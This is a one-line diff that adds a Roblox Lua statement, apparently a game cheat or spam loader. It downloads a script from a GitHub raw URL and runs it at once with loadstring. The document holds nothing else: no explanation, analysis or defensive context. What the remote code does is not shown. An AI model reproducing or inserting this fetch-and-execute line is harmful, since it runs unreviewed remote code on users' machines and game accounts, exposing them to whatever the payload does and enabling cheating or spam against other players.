@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/stick-wars-spam7-sef8txopo9z2i5.lua"))()
